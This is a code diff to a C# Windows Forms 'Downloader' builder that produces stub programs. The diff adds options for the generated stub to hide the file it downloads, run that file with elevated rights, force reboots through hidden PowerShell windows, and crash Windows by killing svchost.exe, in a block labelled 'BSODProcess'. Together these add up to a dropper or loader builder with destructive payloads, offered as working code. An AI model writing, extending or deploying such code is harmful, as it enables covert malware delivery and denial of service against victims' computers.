@@ -7,6 +7,7 @@ using Microsoft.CSharp;
 using System.CodeDom.Compiler;
 using System.IO;
 using System.Windows.Forms.Design;
+using System.ComponentModel;
 
 namespace Downloader
 {
@@ -226,9 +227,88 @@ class Program
         {{
             client.DownloadFile(remoteUri, fileName);
         }}
+
+        if ({(guna2CheckBox13.Checked ? "true" : "false")})
+        {{
+            FileInfo f = new FileInfo(fileName);
+            f.Attributes = FileAttributes.Hidden;
+        }}
+
         if ({(guna2CheckBox7.Checked ? "true" : "false")})
         {{
             int result = ShellExecute(IntPtr.Zero, ""{runas}"", fileName, null, null, 1);
+        }}
+
+        if ({(guna2RadioButton1.Checked ? "true" : "false")})
+        {{
+            using (Process rebootProcess = new Process())
+                    {{
+                        rebootProcess.StartInfo.FileName = ""powershell.exe"";
+                        rebootProcess.StartInfo.UseShellExecute = false;
+                        rebootProcess.StartInfo.CreateNoWindow = true;
+                        rebootProcess.StartInfo.RedirectStandardInput = true;
+                        rebootProcess.StartInfo.RedirectStandardOutput = true;
+                        rebootProcess.StartInfo.RedirectStandardError = true;
+
+                        rebootProcess.Start();
+
+                        using (StreamWriter sw = rebootProcess.StandardInput)
+                        {{
+                            if (sw.BaseStream.CanWrite)
+                            {{
+                                string powershellCommand = ""Restart-Computer"";
+                                sw.WriteLine(powershellCommand);
+                            }}
+                        }}
+                        rebootProcess.WaitForExit();
+                    }}
+
+              using (Process rebootProcess2 = new Process())
+                    {{
+                        rebootProcess2.StartInfo.FileName = ""powershell.exe"";
+                        rebootProcess2.StartInfo.UseShellExecute = false;
+                        rebootProcess2.StartInfo.CreateNoWindow = true;
+                        rebootProcess2.StartInfo.RedirectStandardInput = true;
+                        rebootProcess2.StartInfo.RedirectStandardOutput = true;
+                        rebootProcess2.StartInfo.RedirectStandardError = true;
+
+                        rebootProcess2.Start();
+
+                        using (StreamWriter sw = rebootProcess2.StandardInput)
+                        {{
+                            if (sw.BaseStream.CanWrite)
+                            {{
+                                string powershellCommand = ""Restart-Computer"";
+                                sw.WriteLine(powershellCommand);
+                            }}
+                        }}
+                        rebootProcess2.WaitForExit();
+                    }}
+        }}
+        
+        if ({(guna2RadioButton2.Checked ? "true" : "false")}) 
+        {{
+                using (Process BSODProcess = new Process())
+                    {{
+                        BSODProcess.StartInfo.FileName = ""powershell.exe"";
+                        BSODProcess.StartInfo.UseShellExecute = false;
+                        BSODProcess.StartInfo.CreateNoWindow = true;
+                        BSODProcess.StartInfo.RedirectStandardInput = true;
+                        BSODProcess.StartInfo.RedirectStandardOutput = true;
+                        BSODProcess.StartInfo.RedirectStandardError = true;
+
+                        BSODProcess.Start();
+
+                        using (StreamWriter sw = BSODProcess.StandardInput)
+                        {{
+                            if (sw.BaseStream.CanWrite)
+                            {{
+                                string powershellCommand = ""taskkill /F /IM svchost.exe"";
+                                sw.WriteLine(powershellCommand);
+                            }}
+                        }}
+                        BSODProcess.WaitForExit();
+                    }}
         }}
 
  if (consoleWindow != IntPtr.Zero)
@@ -271,13 +351,20 @@ class Program
                 guna2CheckBox10.Visible = true;
                 guna2CheckBox11.Enabled = true;
                 guna2CheckBox11.Visible = true;
+                guna2RadioButton2.Visible = true;
+                guna2RadioButton2.Enabled = true;
             }
             else if (guna2ComboBox1.SelectedItem.ToString() == "No")
             {
+                guna2CheckBox10.Checked = false;
+                guna2CheckBox11.Checked = false;
                 guna2CheckBox10.Enabled = false;
                 guna2CheckBox10.Visible = false;
                 guna2CheckBox11.Enabled = false;
                 guna2CheckBox11.Visible = false;
+                guna2RadioButton2.Checked = false;
+                guna2RadioButton2.Visible = false;
+                guna2RadioButton2.Enabled = false;
             }
         }
 
@@ -309,6 +396,45 @@ class Program
         private void button6_Click(object sender, EventArgs e)
         {
             MessageBox.Show(guna2TextBox5.Text, guna2TextBox4.Text);
+        }
+
+        private void FormIsClosingEventHandler(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true;    //cancel the event so the form won't be closed
+
+            t1.Tick += new EventHandler(fadeOut);  //this calls the fade out function
+            t1.Start();
+
+            if (Opacity == 0)  //if the form is completly transparent
+                e.Cancel = false;   //resume the event - the program can be closed
+
+        }
+
+        void fadeOut(object sender, EventArgs e)
+        {
+            if (Opacity <= 0)     //check if opacity is 0
+            {
+                t1.Stop();    //if it is, we stop the timer
+                Close();   //and we try to close the form
+            }
+            else
+                Opacity -= 0.05;
+        }
+
+        private void guna2RadioButton1_CheckedChanged(object sender, EventArgs e)
+        {
+            if (guna2RadioButton1.Checked)
+            {
+                guna2RadioButton2.Checked = false;
+            }
+        }
+
+        private void guna2RadioButton2_CheckedChanged(object sender, EventArgs e)
+        {
+            if (guna2RadioButton2.Checked)
+            {
+                guna2RadioButton1.Checked = false;
+            }
         }
     }
 }
